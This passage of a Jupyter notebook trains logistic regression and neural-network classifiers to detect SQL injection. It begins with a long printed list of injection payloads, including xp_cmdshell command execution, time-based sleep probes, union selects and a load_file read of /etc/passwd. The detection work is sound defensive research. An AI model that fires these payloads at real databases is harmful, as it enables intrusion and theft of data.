       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " '\\\\x27UNION SELECT',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select top 1\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " 'to_timestamp_tz',\n",
       " 'tz_offset',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or 1 = 1\",\n",
       " '%27 or 1 = 1',\n",
       " ' $ ( sleep 50 ) ',\n",
       " \" 'sleep 50'\",\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " '&apos; OR',\n",
       " \"'sqlattempt1\",\n",
       " ' ( sqlattempt2 ) ',\n",
       " '|',\n",
       " '%7C',\n",
       " '*|',\n",
       " '%2A%7C',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " ' ( ',\n",
       " '%28',\n",
       " ' ) ',\n",
       " '%29',\n",
       " '&',\n",
       " '%26',\n",
       " '!',\n",
       " '%21',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " \"' or '' = '\",\n",
       " \"x' or 1 = 1 or 'x' = 'y\",\n",
       " '/',\n",
       " '//',\n",
       " '//*',\n",
       " '*/*',\n",
       " \"a' or 3 = 3--\",\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " \"' or 3 = 3\",\n",
       " '‘ or 3 = 3 --',\n",
       " \" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...',\n",
       " ' or 0 = 0 #',\n",
       " 'insert',\n",
       " '1 )  or sleep ( __TIME__ ) #',\n",
       " \" )  or  ( 'a' = 'a\",\n",
       " '; exec xp_regread',\n",
       " '*|',\n",
       " '@var select @var as var into temp end --',\n",
       " '1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'asc',\n",
       " ' ( ||6 ) ',\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " '\" or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '# from wapiti',\n",
       " ' or 0 = 0 --',\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " \" or 'a' = 'a\",\n",
       " 'hi or 1 = 1 --\"',\n",
       " 'or a  =  a',\n",
       " ' UNION ALL SELECT',\n",
       " \" )  or sleep ( __TIME__ )  = '\",\n",
       " '  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \"hi' or 'a' = 'a\",\n",
       " '0',\n",
       " '21 %',\n",
       " 'limit',\n",
       " ' or 1 = 1',\n",
       " ' or 2 > 1',\n",
       " '\"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'PRINT',\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " ' or 3 = 3',\n",
       " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...',\n",
       " 'or 1 = 1',\n",
       " '1 or sleep ( __TIME__ ) #',\n",
       " 'or 1 = 1',\n",
       " ' and 1 in  ( select var from temp ) --',\n",
       " \" or '7659' = '7659\",\n",
       " \" or 'text'  =  n'text'\",\n",
       " ' --',\n",
       " \" or 1 = 1 or '' = '\",\n",
       " 'declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...',\n",
       " 'exec xp',\n",
       " \"; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " '3.10E+17',\n",
       " '\" or pg_sleep ( __TIME__ ) --',\n",
       " \"x' AND email IS NULL; --\",\n",
       " '&',\n",
       " \"admin' or '\",\n",
       " \" or 'unusual'  =  'unusual'\",\n",
       " '//',\n",
       " 'truncate',\n",
       " '1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '\\\\x27UNION SELECT',\n",
       " 'declare @s varchar ( 200 )  select @s  =  0x77616974 ...',\n",
       " 'tz_offset',\n",
       " 'sqlvuln',\n",
       " '\"  )  )  ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '||6',\n",
       " 'or 1 = 1 --',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " 'or a = a',\n",
       " ' )  union select * from information_schema.tables;',\n",
       " 'PRINT @@variable',\n",
       " 'or isNULL ( 1/0 )  /*',\n",
       " '26 %',\n",
       " '\" or \"a\" = \"a',\n",
       " ' ( sqlvuln ) ',\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " ' or 1 = 1--',\n",
       " ' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...',\n",
       " '0x770061006900740066006F0072002000640065006C00 ...',\n",
       " \" 'sleep 50'\",\n",
       " 'as',\n",
       " '1  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '/**/or/**/1/**/ = /**/1',\n",
       " ' union all select @@version--',\n",
       " ',@variable',\n",
       " ' ( sqlattempt2 ) ',\n",
       " ' or  ( EXISTS ) ',\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\",\n",
       " ' $ ( sleep 50 ) ',\n",
       " '1 or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \" or '' = '\",\n",
       " '||UTL_HTTP.REQUEST',\n",
       " ' or pg_sleep ( __TIME__ ) --',\n",
       " \"hi' or 'x' = 'x';\",\n",
       " '\" )  or sleep ( __TIME__ )  = \"',\n",
       " \" or 'whatever' in  ( 'whatever' ) \",\n",
       " \"; begin declare @var varchar ( 8000 )  set @var = ' ...\",\n",
       " \" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
       " '0x77616974666F722064656C61792027303A303A313027 ...',\n",
       " 'exec ( @s ) ',\n",
       " ' )  or pg_sleep ( __TIME__ ) --',\n",
       " ' union select',\n",
       " ' or sleep ( __TIME__ ) #',\n",
       " ' select * from information_schema.tables--',\n",
       " \"a' or 1 = 1--\",\n",
       " \"a' or 'a'  =  'a\",\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " ' or 2 between 1 and 3',\n",
       " ' or a = a--',\n",
       " \" or '1' = '1\",\n",
       " '|',\n",
       " \" or sleep ( __TIME__ )  = '\",\n",
       " \" or 1 --'\",\n",
       " 'or 0 = 0 #\"',\n",
       " 'having',\n",
       " \"a'\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c ...',\n",
       " 'â\\x80\\x98 or 1 = 1 --',\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " 'order by',\n",
       " 'bfilename',\n",
       " ' having 1 = 1--',\n",
       " ' )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " ' or username like char ( 37 ) ;',\n",
       " \";waitfor delay '0:0:__TIME__'--\",\n",
       " '\" or 1 = 1--',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " '*/*',\n",
       " \" or 'text' > 't'\",\n",
       " '  ( select top 1',\n",
       " ...]"
      ]
     },
     "execution_count": 122,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentence"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Combination of benign an attack data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to sql data\n",
    "\n",
    "values=[]\n",
    "for i in all_sqli_sentence:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to benign data\n",
    "\n",
    "for i in data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4200"
      ]
     },
     "execution_count": 129,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)+len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4200"
      ]
     },
     "execution_count": 126,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in benign_data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4676"
      ]
     },
     "execution_count": 128,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(\"a' \", 1)"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert to dataframe\n",
    "\n",
    "df=pd.DataFrame(values,columns=['Sentence','Label'])\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>a</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>a'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>a' --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>a' or 1 = 1; --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>@</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          Sentence  Label\n",
       "0                a      1\n",
       "1              a'       1\n",
       "2            a' --      1\n",
       "3  a' or 1 = 1; --      1\n",
       "4                @      1"
      ]
     },
     "execution_count": 133,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save data as csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('sqli.csv', index=False, encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.read_csv('sqli.csv',encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [],
   "source": [
    "# vectorization of data\n",
    "\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "vectorizer = CountVectorizer( min_df=2, max_df=0.7, stop_words=stopwords.words('english'))\n",
    "posts = vectorizer.fit_transform(df['Sentence'].values.astype('U')).toarray()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[0, 0, 0, ..., 0, 0, 0],\n",
       "       [0, 0, 0, ..., 0, 0, 0],\n",
       "       [0, 0, 0, ..., 0, 0, 0],\n",
       "       ...,\n",
       "       [0, 0, 0, ..., 0, 0, 0],\n",
       "       [0, 0, 0, ..., 0, 0, 0],\n",
       "       [0, 0, 0, ..., 0, 0, 0]])"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4676, 4906)"
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [],
   "source": [
    "transformed_posts=pd.DataFrame(posts)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.concat([df,transformed_posts],axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "      <th>0</th>\n",
       "      <th>1</th>\n",
       "      <th>2</th>\n",
       "      <th>3</th>\n",
       "      <th>4</th>\n",
       "      <th>5</th>\n",
       "      <th>6</th>\n",
       "      <th>7</th>\n",
       "      <th>...</th>\n",
       "      <th>4896</th>\n",
       "      <th>4897</th>\n",
       "      <th>4898</th>\n",
       "      <th>4899</th>\n",
       "      <th>4900</th>\n",
       "      <th>4901</th>\n",
       "      <th>4902</th>\n",
       "      <th>4903</th>\n",
       "      <th>4904</th>\n",
       "      <th>4905</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>a</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>a'</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>a' --</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>a' or 1 = 1; --</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>@</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 4908 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "          Sentence  Label  0  1  2  3  4  5  6  7  ...  4896  4897  4898  \\\n",
       "0                a      1  0  0  0  0  0  0  0  0  ...     0     0     0   \n",
       "1              a'       1  0  0  0  0  0  0  0  0  ...     0     0     0   \n",
       "2            a' --      1  0  0  0  0  0  0  0  0  ...     0     0     0   \n",
       "3  a' or 1 = 1; --      1  0  0  0  0  0  0  0  0  ...     0     0     0   \n",
       "4                @      1  0  0  0  0  0  0  0  0  ...     0     0     0   \n",
       "\n",
       "   4899  4900  4901  4902  4903  4904  4905  \n",
       "0     0     0     0     0     0     0     0  \n",
       "1     0     0     0     0     0     0     0  \n",
       "2     0     0     0     0     0     0     0  \n",
       "3     0     0     0     0     0     0     0  \n",
       "4     0     0     0     0     0     0     0  \n",
       "\n",
       "[5 rows x 4908 columns]"
      ]
     },
     "execution_count": 143,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {},
   "outputs": [],
   "source": [
    "X=df[df.columns[2:]]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4676, 4906)"
      ]
     },
     "execution_count": 145,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [],
   "source": [
    "y=df['Label']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [],
   "source": [
    "# split train test data\n",
    "\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4676, 4906)"
      ]
     },
     "execution_count": 149,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "\n",
    "clf = LogisticRegression(random_state=0).fit(X_train, y_train)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.metrics import accuracy_score"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {},
   "outputs": [],
   "source": [
    "y_pred=clf.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9006410256410257"
      ]
     },
     "execution_count": 153,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracy_score(y_test, y_pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i,j in zip(y_test,y_pred):\n",
    "    print(i==j)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 154,
   "metadata": {},
   "outputs": [],
   "source": [
    "from keras.models import Sequential\n",
    "from keras import layers\n",
    "from keras.preprocessing.text import Tokenizer\n",
    "from keras.wrappers.scikit_learn import KerasClassifier"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {},
   "outputs": [],
   "source": [
    "input_dim = X_train.shape[1]  # Number of features\n",
    "\n",
    "model = Sequential()\n",
    "model.add(layers.Dense(20, input_dim=input_dim, activation='relu'))\n",
    "model.add(layers.Dense(10,  activation='tanh'))\n",
    "# model.add(layers.Flatten())\n",
    "model.add(layers.Dense(1024, activation='relu'))\n",
    "\n",
    "model.add(layers.BatchNormalization())\n",
    "model.add(layers.Dropout(0.5))\n",
    "model.add(layers.Dense(1, activation='sigmoid'))\n",
    "# model.add(Activation('softmax'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"sequential_1\"\n",
      "_________________________________________________________________\n",
      "Layer (type)                 Output Shape              Param #   \n",
      "=================================================================\n",
      "dense_1 (Dense)              (None, 20)                98140     \n",
      "_________________________________________________________________\n",
      "dense_2 (Dense)              (None, 10)                210       \n",
      "_________________________________________________________________\n",
      "dense_3 (Dense)              (None, 1024)              11264     \n",
      "_________________________________________________________________\n",
      "batch_normalization_1 (Batch (None, 1024)              4096      \n",
      "_________________________________________________________________\n",
      "dropout_1 (Dropout)          (None, 1024)              0         \n",
      "_________________________________________________________________\n",
      "dense_4 (Dense)              (None, 1)                 1025      \n",
      "=================================================================\n",
      "Total params: 114,735\n",
      "Trainable params: 112,687\n",
      "Non-trainable params: 2,048\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "model.compile(loss='binary_crossentropy', \n",
    "              optimizer='adam', \n",
    "              metrics=['accuracy'])\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Train on 3740 samples, validate on 936 samples\n",
      "Epoch 1/10\n",
      "3740/3740 [==============================] - 4s 985us/step - loss: 0.2285 - accuracy: 0.8952 - val_loss: 0.5872 - val_accuracy: 0.7415\n",
      "Epoch 2/10\n",
      "3740/3740 [==============================] - 2s 663us/step - loss: 0.1431 - accuracy: 0.9348 - val_loss: 0.3308 - val_accuracy: 0.8088\n",
      "Epoch 3/10\n",
      "3740/3740 [==============================] - 2s 575us/step - loss: 0.1322 - accuracy: 0.9390 - val_loss: 0.1477 - val_accuracy: 0.9380\n",
      "Epoch 4/10\n",
      "3740/3740 [==============================] - 2s 645us/step - loss: 0.1245 - accuracy: 0.9465 - val_loss: 0.1405 - val_accuracy: 0.9412\n",
      "Epoch 5/10\n",
      "3740/3740 [==============================] - 2s 590us/step - loss: 0.1086 - accuracy: 0.9500 - val_loss: 0.1431 - val_accuracy: 0.9402\n",
      "Epoch 6/10\n",
      "3740/3740 [==============================] - 3s 746us/step - loss: 0.1162 - accuracy: 0.9508 - val_loss: 0.1556 - val_accuracy: 0.9359\n",
      "Epoch 7/10\n",
      "3740/3740 [==============================] - 2s 643us/step - loss: 0.0999 - accuracy: 0.9543 - val_loss: 0.1911 - val_accuracy: 0.9156\n",
      "Epoch 8/10\n",
      "3740/3740 [==============================] - 2s 645us/step - loss: 0.1003 - accuracy: 0.9599 - val_loss: 0.1652 - val_accuracy: 0.9156\n",
      "Epoch 9/10\n",
      "3740/3740 [==============================] - 2s 658us/step - loss: 0.1119 - accuracy: 0.9484 - val_loss: 0.1568 - val_accuracy: 0.9188\n",
      "Epoch 10/10\n",
      "3740/3740 [==============================] - 3s 713us/step - loss: 0.1077 - accuracy: 0.9481 - val_loss: 0.1332 - val_accuracy: 0.9380\n"
     ]
    }
   ],
   "source": [
    "classifier_nn = model.fit(X_train,y_train,\n",
    "                    epochs=10,\n",
    "                    verbose=True,\n",
    "                    validation_data=(X_test, y_test),\n",
    "                    batch_size=15)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [],
   "source": [
    "pred=model.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(pred)):\n",
    "    if pred[i]>0.5:\n",
    "        pred[i]=1\n",
    "    elif pred[i]<=0.5:\n",
    "        pred[i]=0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9726190476190476"
      ]
     },
     "execution_count": 97,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracy_score(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i,j in zip(y_test,pred):\n",
    "    print(i==j)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Saving Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [],
   "source": [
    "from keras.models import load_model\n",
    "import pickle\n",
    "\n",
    "model.save('my_model_additional_data.h5')\n",
    "with open('vectorizer_additional_data', 'wb') as fin:\n",
    "    pickle.dump(vectorizer, fin)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Confusion Matrix\n",
    "#### Assumption:\n",
    "1. SQLI attack type is positive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [],
   "source": [
    "def accuracy_function(tp,tn,fp,fn):\n",
    "    \n",
    "    accuracy = (tp+tn) / (tp+tn+fp+fn)\n",
    "    \n",
    "    return accuracy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {},
   "outputs": [],
   "source": [
    "def precision_function(tp,fp):\n",
    "    \n",
    "    precision = tp / (tp+fp)\n",
    "    \n",
    "    return precision"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {},
   "outputs": [],
   "source": [
    "def recall_function(tp,fn):\n",
    "    \n",
    "    recall=tp / (tp+fn)\n",
    "    \n",
    "    return recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [],
   "source": [
    "def confusion_matrix(truth,predicted):\n",
    "    \n",
    "    true_positive = 0\n",
    "    true_negative = 0\n",
    "    false_positive = 0\n",
    "    false_negative = 0\n",
    "    \n",
    "    for true,pred in zip(truth,predicted):\n",
    "        \n",
    "        if true == 1:\n",
    "            if pred == true:\n",
    "                true_positive += 1\n",
    "            elif pred != true:\n",
    "                false_negative += 1\n",
    "\n",
    "        elif true == 0:\n",
    "            if pred == true:\n",
    "                true_negative += 1\n",
    "            elif pred != true:\n",
    "                false_positive += 1\n",
    "            \n",
    "    accuracy=accuracy_function(true_positive, true_negative, false_positive, false_negative)\n",
    "    precision=precision_function(true_positive, false_positive)\n",
    "    recall=recall_function(true_positive, false_negative)\n",
    "    \n",
    "    return (accuracy,\n",
    "            precision,\n",
    "           recall)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Accuracy : 0.938034188034188 \n",
      " Precision : 0.823943661971831 \n",
      " Recall : 0.9669421487603306\n"
     ]
    }
   ],
   "source": [
    "print(\" Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
